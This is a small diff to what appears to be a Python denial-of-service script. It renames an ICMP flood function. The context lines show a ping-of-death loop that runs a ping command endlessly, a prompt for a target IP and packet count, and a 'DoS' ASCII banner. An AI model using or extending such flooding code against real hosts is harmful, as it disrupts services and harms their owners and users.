@@ -71,7 +71,7 @@ def Pingofdeath():
     while(1):
         os.system(pingCommand)
 
-def icmpflood():
+def Icmpflood():
     targetip = raw_input("Target IP: ")
     cycle = raw_input("Number of packets: ")
 
@@ -162,6 +162,6 @@ def main():
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-	icmpflood()
+	Icmpflood()
 if __name__ == "__main__":
     main()
